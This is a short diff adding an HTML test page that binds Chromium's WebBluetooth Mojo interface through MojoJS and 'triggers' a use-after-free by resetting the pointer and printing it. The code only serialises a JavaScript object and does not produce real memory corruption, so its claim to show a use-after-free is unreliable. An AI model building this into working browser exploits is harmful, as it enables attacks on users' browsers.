@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Use-After-Free Test Page</title>
+</head>
+<body>
+  <div id="console"></div>
+  <script src="mojo_bindings.js"></script>
+  <script src="third_party/blink/public/mojom/bluetooth/web_bluetooth.mojom.js"></script>
+  <script>
+    let bluetooth_service = new blink.mojom.WebBluetoothServicePtr();
+
+    Mojo.bindInterface(blink.mojom.WebBluetoothService.name, mojo.makeRequest(bluetooth_service).handle, "context");
+
+    // Function to display messages in the console
+    function logMessage(message) {
+      let consoleDiv = document.getElementById('console');
+      consoleDiv.innerHTML += message + '<br>';
+    }
+
+    // Simulate a use-after-free vulnerability
+    function triggerUseAfterFree() {
+      bluetooth_service.ptr.reset();
+      logMessage('Attempting to access bluetooth_service after reset:');
+      logMessage(JSON.stringify(bluetooth_service)); // Accessing a member after reset
+    }
+
+    // Call the function to trigger the use-after-free condition
+    triggerUseAfterFree();
+  </script>
+</body>
+</html>
